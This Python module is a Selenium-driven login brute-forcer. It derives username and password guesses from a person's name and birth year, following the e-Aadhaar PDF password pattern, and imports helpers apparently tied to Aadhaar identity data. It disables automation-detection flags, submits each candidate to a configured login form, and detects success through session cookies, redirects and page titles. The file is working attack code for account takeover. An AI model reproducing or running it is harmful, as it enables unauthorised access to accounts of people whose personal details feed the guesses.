"""Configurable website login — Selenium + auto success/fail detection."""

from __future__ import annotations

import asyncio
import logging
import os
import time
from dataclasses import dataclass
from typing import Any, Literal

from pdf_unlock import build_pdf_password_candidates, build_year_bruteforce_passwords, pdf_name_prefix
from uidai_api import is_skip_name, normalize_dob, normalize_name

log = logging.getLogger('login-try')

Outcome = Literal['success', 'fail']


@dataclass
class LoginSiteConfig:
    url: str
    username: str
    user_selector: str
    pass_selector: str
    submit_selector: str = ''
    success_url_contains: str = ''
    success_selector: str = ''
    fail_text: str = ''
    headless: bool = True
    wait_sec: float = 8.0

    @classmethod
    def from_env(cls) -> LoginSiteConfig:
        url = os.getenv('LOGIN_SITE_URL', '').strip()
        username = os.getenv('LOGIN_USERNAME', '').strip()
        user_sel = os.getenv('LOGIN_USER_SELECTOR', 'input[name="username"]').strip()
        pass_sel = os.getenv('LOGIN_PASS_SELECTOR', 'input[name="password"]').strip()
        submit_sel = os.getenv('LOGIN_SUBMIT_SELECTOR', 'button[type="submit"]').strip()
        if not url or not username:
            raise ValueError('Set LOGIN_SITE_URL and LOGIN_USERNAME in .env')
        headless = os.getenv('LOGIN_HEADLESS', '1').strip().lower() not in ('0', 'false', 'no')
        try:
            wait_sec = float(os.getenv('LOGIN_WAIT_SEC', '8') or '8')
        except ValueError:
            wait_sec = 8.0
        return cls(
            url=url,
            username=username,
            user_selector=user_sel,
            pass_selector=pass_sel,
            submit_selector=submit_sel,
            success_url_contains=os.getenv('LOGIN_SUCCESS_URL', '').strip(),
            success_selector=os.getenv('LOGIN_SUCCESS_SELECTOR', '').strip(),
            fail_text=os.getenv('LOGIN_FAIL_TEXT', '').strip(),
            headless=headless,
            wait_sec=max(2.0, wait_sec),
        )


def build_login_passwords(name: str, dob: str | None = None) -> list[str]:
    """Same candidates as e-Aadhaar PDF unlock — NAME4+YEAR etc."""
    nm = normalize_name(name)
    dob_norm = normalize_dob(dob) if dob else None
    return build_pdf_password_candidates([nm], dob_norm)


def build_login_passwords_year_only(name: str) -> list[str]:
    nm = normalize_name(name)
    if is_skip_name(nm):
        return []
    return build_year_bruteforce_passwords([nm])


def build_login_username_candidates(name: str) -> list[str]:
    """Common username patterns from enrollment name."""
    nm = normalize_name(name)
    if is_skip_name(nm):
        return []
    parts = [p for p in nm.split() if p]
    compact = ''.join(parts)
    prefix = pdf_name_prefix(nm)
    seen: set[str] = set()
    out: list[str] = []

    def add(value: str) -> None:
        v = (value or '').strip()
        if v and v not in seen:
            seen.add(v)
            out.append(v)

    add(prefix)
    add(prefix.lower())
    add(compact.lower())
    add(compact.upper())
    if parts:
        add(parts[0].lower())
        add(parts[0].upper())
        if len(parts) >= 2:
            add(f'{parts[0].lower()}.{parts[-1].lower()}')
            add(f'{parts[0].lower()}{parts[-1].lower()}')
    return out


@dataclass
class LoginTryResult:
    ok: bool
    password: str = ''
    tried: int = 0
    elapsed_sec: float = 0.0
    message: str = ''
    final_url: str = ''


def _make_chrome_driver(headless: bool):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options

    opts = Options()
    if headless:
        opts.add_argument('--headless=new')
    opts.add_argument('--no-sandbox')
    opts.add_argument('--disable-dev-shm-usage')
    opts.add_argument('--disable-gpu')
    opts.add_argument('--window-size=1280,800')
    opts.add_argument('--disable-blink-features=AutomationControlled')
    opts.add_experimental_option('excludeSwitches', ['enable-automation'])
    opts.add_experimental_option('useAutomationExtension', False)

    chrome_bin = os.getenv('CHROME_BIN', '').strip()
    if chrome_bin:
        opts.binary_location = chrome_bin

    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(45)
    driver.implicitly_wait(0)
    return driver


def _by_css(selector: str):
    from selenium.webdriver.common.by import By
    return (By.CSS_SELECTOR, selector)


def _visible(driver, selector: str) -> bool:
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    if not selector:
        return False
    try:
        WebDriverWait(driver, 0.8).until(EC.visibility_of_element_located(_by_css(selector)))
        return True
    except Exception:
        return False


def _page_text_lower(driver) -> str:
    try:
        return (driver.find_element('tag name', 'body').text or '').lower()
    except Exception:
        return (driver.page_source or '').lower()


def _capture_baseline(driver, cfg: LoginSiteConfig) -> dict[str, Any]:
    return {
        'url': (driver.current_url or '').lower(),
        'title': (driver.title or '').lower(),
        'pass_visible': _visible(driver, cfg.pass_selector),
        'user_visible': _visible(driver, cfg.user_selector),
        'cookies': {c['name']: c.get('value', '') for c in driver.get_cookies()},
    }


def _cookies_changed(before: dict[str, str], after: dict[str, str]) -> bool:
    auth_hints = ('session', 'auth', 'token', 'sid', 'jwt', 'logged', 'php')
    for name, value in after.items():
        low = name.lower()
        if any(h in low for h in auth_hints):
            if before.get(name) != value:
                return True
    if len(after) > len(before):
        for name in after:
            if name not in before:
                return True
    return False


def _explicit_fail(driver, cfg: LoginSiteConfig) -> bool:
    if cfg.fail_text and cfg.fail_text.lower() in _page_text_lower(driver):
        return True
    fail_selectors = (
        '.alert-danger', '.error', '.invalid-feedback', '[role="alert"]',
        '.login-error', '.text-danger',
    )
    for sel in fail_selectors:
        try:
            el = driver.find_element('css selector', sel)
            if el.is_displayed() and (el.text or '').strip():
                return True
        except Exception:
            continue
    return False


def _explicit_success(driver, cfg: LoginSiteConfig) -> bool:
    url = (driver.current_url or '').lower()
    if cfg.success_url_contains and cfg.success_url_contains.lower() in url:
        return True
    if cfg.success_selector and _visible(driver, cfg.success_selector):
        return True
    return False


def _auto_success(driver, cfg: LoginSiteConfig, baseline: dict[str, Any]) -> bool:
    if _explicit_fail(driver, cfg):
        return False
    if _explicit_success(driver, cfg):
        return True

    url = (driver.current_url or '').lower()
    start_url = baseline.get('url', '')
    pass_was_visible = baseline.get('pass_visible', False)
    pass_now_visible = _visible(driver, cfg.pass_selector)

    # Password box gayab + error nahi = login ho gaya
    if pass_was_visible and not pass_now_visible:
        return True

    # URL badla aur ab login page pe nahi
    if url and url != start_url:
        login_hints = ('login', 'signin', 'sign-in', 'auth/login')
        if not any(h in url for h in login_hints):
            if not pass_now_visible:
                return True

    # Naya session cookie set hua
    try:
        after_cookies = {c['name']: c.get('value', '') for c in driver.get_cookies()}
        if _cookies_changed(baseline.get('cookies', {}), after_cookies) and not pass_now_visible:
            return True
    except Exception:
        pass

    # Title badla (dashboard, home, welcome…)
    title = (driver.title or '').lower()
    start_title = baseline.get('title', '')
    if title and title != start_title:
        good = ('dashboard', 'home', 'welcome', 'panel', 'account', 'profile')
        bad = ('login', 'sign in', 'error', 'invalid')
        if any(g in title for g in good) and not any(b in title for b in bad):
            if not pass_now_visible:
                return True

    return False


def _wait_login_outcome(driver, cfg: LoginSiteConfig, baseline: dict[str, Any]) -> Outcome:
    deadline = time.monotonic() + cfg.wait_sec
    while time.monotonic() < deadline:
        if _auto_success(driver, cfg, baseline):
            return 'success'
        if _explicit_fail(driver, cfg):
            return 'fail'
        time.sleep(0.25)
    if _auto_success(driver, cfg, baseline):
        return 'success'
    return 'fail'


def _fill_field(driver, selector: str, value: str) -> None:
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait

    el = WebDriverWait(driver, 12).until(EC.element_to_be_clickable(_by_css(selector)))
    el.click()
    el.send_keys(Keys.CONTROL, 'a')
    el.send_keys(Keys.DELETE)
    el.clear()
    el.send_keys(value)


def _submit_login(driver, cfg: LoginSiteConfig) -> None:
    from selenium.webdriver.common.keys import Keys

    if cfg.submit_selector and _visible(driver, cfg.submit_selector):
        driver.find_element('css selector', cfg.submit_selector).click()
    else:
        driver.find_element('css selector', cfg.pass_selector).send_keys(Keys.RETURN)


def _reload_login_page(driver, cfg: LoginSiteConfig) -> None:
    driver.get(cfg.url)
    time.sleep(0.5)
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait
    WebDriverWait(driver, 15).until(EC.presence_of_element_located(_by_css(cfg.pass_selector)))


def _try_login_passwords_sync(
    cfg: LoginSiteConfig,
    passwords: list[str],
    *,
    delay_sec: float = 0.5,
    max_tries: int | None = None,
    on_progress: Any | None = None,
) -> LoginTryResult:
    pwd_list = [p for p in passwords if p]
    if max_tries is not None:
        pwd_list = pwd_list[:max_tries]
    if not pwd_list:
        return LoginTryResult(ok=False, message='No passwords to try')

    t0 = time.monotonic()
    tried = 0
    driver = _make_chrome_driver(cfg.headless)

    def progress(msg: str) -> None:
        if on_progress:
            try:
                on_progress(msg)
            except Exception:
                pass

    try:
        _reload_login_page(driver, cfg)

        for pwd in pwd_list:
            tried += 1
            progress(f'Try {tried}/{len(pwd_list)}: {pwd[:2]}***')

            baseline = _capture_baseline(driver, cfg)
            try:
                _fill_field(driver, cfg.user_selector, cfg.username)
                _fill_field(driver, cfg.pass_selector, pwd)
                _submit_login(driver, cfg)
            except Exception as exc:
                log.warning('fill/submit fail: %s', exc)
                try:
                    _reload_login_page(driver, cfg)
                except Exception:
                    pass
                time.sleep(delay_sec)
                continue

            outcome = _wait_login_outcome(driver, cfg, baseline)
            if outcome == 'success':
                elapsed = time.monotonic() - t0
                return LoginTryResult(
                    ok=True,
                    password=pwd,
                    tried=tried,
                    elapsed_sec=elapsed,
                    message='Login OK (Selenium auto-detect)',
                    final_url=driver.current_url or '',
                )

            try:
                _reload_login_page(driver, cfg)
            except Exception:
                pass
            time.sleep(delay_sec)

        elapsed = time.monotonic() - t0
        return LoginTryResult(
            ok=False,
            tried=tried,
            elapsed_sec=elapsed,
            message=f'No match in {tried} tries',
            final_url=driver.current_url or '',
        )
    finally:
        try:
            driver.quit()
        except Exception:
            pass


async def try_login_passwords(
    cfg: LoginSiteConfig,
    passwords: list[str],
    *,
    delay_sec: float = 0.5,
    max_tries: int | None = None,
    on_progress: Any | None = None,
) -> LoginTryResult:
    """Selenium — fill username + password; auto-detect login success."""
    return await asyncio.to_thread(
        _try_login_passwords_sync,
        cfg,
        passwords,
        delay_sec=delay_sec,
        max_tries=max_tries,
        on_progress=on_progress,
    )
